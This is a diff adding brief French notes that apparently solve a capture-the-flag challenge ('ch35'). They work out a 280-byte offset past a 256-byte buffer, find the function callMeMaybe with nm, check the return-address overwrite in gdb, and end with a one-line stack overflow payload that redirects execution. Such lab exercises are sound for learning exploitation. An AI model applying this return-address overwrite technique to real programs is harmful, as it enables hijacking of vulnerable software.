@@ -1,0 +1,7 @@
+Taille du buffer = 256 / faire des tests pour voir a partir de combien l'adresse est ecrasee. (280)
+python -c " print 'A'*400"
+nm le a.aout pour trouver l'adresse de la fonction callMeMaybe
+avec l'aide de gdb on verifie si on ecrase bien la valeur du return ; du main avec des B 
+run <<< $(python -c "print 'A'*280 + 'B'*8")
+(python -c 'print "A"*280+"\xcd\x06\x40\x00\x00\x00\x00\x00"'; cat) | ./ch35
+ 
